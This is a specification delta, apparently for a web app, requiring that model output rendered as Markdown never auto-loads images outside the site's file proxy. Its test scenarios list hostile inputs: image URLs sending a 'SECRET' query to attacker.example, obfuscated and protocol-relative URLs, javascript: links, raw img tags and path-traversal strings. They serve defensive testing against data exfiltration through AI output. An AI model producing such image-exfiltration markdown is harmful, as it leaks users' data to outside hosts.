# Spec Delta

## Purpose

规定模型输出在网页上按 Markdown 渲染时浏览器可以自动加载什么：只有站内文件代理下的图片会显示，其它图片地址一律不加载；同时规定被拦下的图片与外部链接怎么呈现、规则覆盖哪些页面。

## ADDED Requirements

### Requirement: 允许清单之外的图片不自动加载
模型输出按 Markdown 渲染时，图片地址不在允许清单内的，页面 SHALL NOT 生成图片元素，也 SHALL NOT 生成任何会让浏览器不经用户操作就请求该地址的元素（含预加载）。行内写法、引用式写法、协议相对地址、带反斜杠或控制字符的变形地址、包在链接里的图片 SHALL 同样处理。模型输出里的原始 HTML SHALL 按文字显示，SHALL NOT 被当作标签渲染。

#### Scenario: 行内外部图片
- **WHEN** 运行 `npx tsx src/components/__tests__/ai-markdown.test.tsx`，渲染 `![报价](https://attacker.example/p.png?d=SECRET)`
- **THEN** 渲染结果里没有图片元素、没有预加载元素，也没有任何 `src` 属性指向 `attacker.example`

#### Scenario: 引用式写法
- **WHEN** 同一测试渲染一张用引用式写法（`![x][r]` 加地址定义）指向 `https://attacker.example/ref.png` 的图片
- **THEN** 渲染结果里没有图片元素

#### Scenario: 协议相对与变形地址
- **WHEN** 运行 `npx tsx src/lib/ai-markdown/__tests__/url-policy.test.ts`，判定 `//attacker.example/a.png`、`/\attacker.example/a.png`、中间夹制表符的 `/<TAB>/attacker.example/a.png`、`data:image/png;base64,AAAA`、`javascript:alert(1)`
- **THEN** 每一条都判定为不允许

#### Scenario: 包在链接里的图片
- **WHEN** 渲染测试渲染 `[![看图](https://attacker.example/i.png)](https://attacker.example/l)`
- **THEN** 渲染结果里没有图片元素；链接仍在，里面是文字提示

#### Scenario: 原始 HTML 图片标签
- **WHEN** 渲染测试渲染 `<img src="https://attacker.example/raw.png">`
- **THEN** 这段内容以转义后的文字出现，渲染结果里没有图片元素

### Requirement: 被拦下的图片显示为不可点击的文字提示
被拦下的图片 SHALL 在原位置显示一段文字提示，含「图片未加载」、该图片的替代文字（有则显示）与地址的主机名（有则显示）。这段提示 SHALL NOT 是链接或按钮，SHALL NOT 输出图片地址的路径与查询串。

#### Scenario: 提示的内容
- **WHEN** 运行 `npx tsx src/components/__tests__/ai-markdown.test.tsx`，渲染 `![报价](https://attacker.example/p.png?d=SECRET)`
- **THEN** 渲染结果的文字里有「图片未加载」「报价」「attacker.example」，没有 `SECRET`，这段提示不在任何链接元素之内

#### Scenario: 没有替代文字
- **WHEN** 同一测试渲染 `![](https://attacker.example/p.png)`
- **THEN** 提示里有「图片未加载」与 `attacker.example`，没有多余的空括号或空冒号

### Requirement: 站内文件图片照常显示
图片地址是站内相对路径、且规范化之后位于站内文件代理（`/api/files/`）之下时，页面 SHALL 把它渲染为图片，图片地址取规范化之后的站内路径。站内的其它路径、规范化之后落到 `/api/files/` 之外的路径、以及任何带协议或主机的绝对地址（含指向青砚自己域名的） SHALL NOT 渲染为图片。

#### Scenario: 站内文件图片
- **WHEN** 运行 `npx tsx src/components/__tests__/ai-markdown.test.tsx`，渲染 `![效果图](/api/files/ai-chat/org1/a.png)`
- **THEN** 渲染结果里有一个图片元素，`src` 为 `/api/files/ai-chat/org1/a.png`，`alt` 为「效果图」

#### Scenario: 路径穿越
- **WHEN** 运行 `npx tsx src/lib/ai-markdown/__tests__/url-policy.test.ts`，判定 `/api/files/../auth/logout` 与 `/api/files/%2e%2e/auth/logout`
- **THEN** 两条都判定为不允许

#### Scenario: 站内其它路径与绝对地址
- **WHEN** 同一测试判定 `/api/auth/logout`、`/dashboard`、`api/files/a.png`（不以 `/` 开头）、`https://qingyan.example/api/files/a.png`
- **THEN** 每一条都判定为不允许

### Requirement: 规则覆盖全部渲染模型输出的页面
助手对话、外贸对话、市场情报监测详情、市场情报手动分析、标讯情报卡 SHALL 全部按本能力的规则渲染模型输出。仓库里 SHALL NOT 存在绕开这套规则、直接把模型输出交给 Markdown 渲染库的页面或组件。

#### Scenario: 五个页面都走统一渲染
- **WHEN** 运行 `npx tsx src/components/__tests__/ai-markdown.test.tsx`，对五个页面的源码做断言
- **THEN** 五个文件都使用统一渲染组件，且都不再直接引入 Markdown 渲染库

#### Scenario: 没有第二处直接渲染
- **WHEN** 同一测试扫描 `src/` 下全部 `.ts` / `.tsx` 源文件
- **THEN** 直接引入 Markdown 渲染库的文件只有统一渲染组件一个；新增第二个时测试失败并列出文件路径

#### Scenario: 调用方不能把图片规则换掉
- **WHEN** 同一测试以调用方自带的图片与链接渲染覆盖项渲染 `![x](https://attacker.example/p.png)`
- **THEN** 渲染结果里仍然没有图片元素

### Requirement: 外部链接可点击并显示真实去向
模型输出里的链接 SHALL 保持可点击。指向外部主机的链接 SHALL 在新标签页打开，SHALL NOT 向目标站传递来源页地址，SHALL NOT 让目标页拿到打开它的窗口；链接文字里不含目标主机名时，页面 SHALL 在链接之后显示该主机名。站内相对链接 SHALL 维持在当前页打开且不附加主机名。

#### Scenario: 文字与去向不一致的外部链接
- **WHEN** 运行 `npx tsx src/components/__tests__/ai-markdown.test.tsx`，渲染 `[查看报价详情](https://attacker.example/c?d=1)`
- **THEN** 链接的 `href` 不变，带 `target="_blank"`，`rel` 含 `noopener` 与 `noreferrer`，链接之后的文字里有 `attacker.example`

#### Scenario: 文字本身就是地址
- **WHEN** 同一测试渲染一段含裸地址 `https://docs.example.org/guide` 的文字
- **THEN** 该地址成为外部链接，带新标签页与 `rel` 属性，链接之后不重复显示主机名

#### Scenario: 站内链接
- **WHEN** 同一测试渲染 `[打开项目](/projects/abc)`
- **THEN** 链接没有 `target` 属性，之后没有主机名

### Requirement: 渲染规则是确定性的且不改服务端
本能力的判定 SHALL NOT 调用模型，SHALL NOT 发起网络请求，SHALL NOT 依赖环境变量或开关：同一段输入在任何组织、任何用户、任何部署环境下得到同一渲染结果。本能力 SHALL NOT 改变任何接口的响应、存库的消息文本或发往微信 / Muse 通道的文字。

#### Scenario: 服务端与数据结构无改动
- **WHEN** 在仓库根运行 `git diff --stat main -- src/app/api prisma vercel.json next.config.ts src/proxy.ts`
- **THEN** 输出为空

#### Scenario: 判定不读环境
- **WHEN** 运行 `npx tsx src/lib/ai-markdown/__tests__/url-policy.test.ts`，对地址判定模块的源码做断言
- **THEN** 其中没有对 `process.env`、`window`、`fetch` 的引用
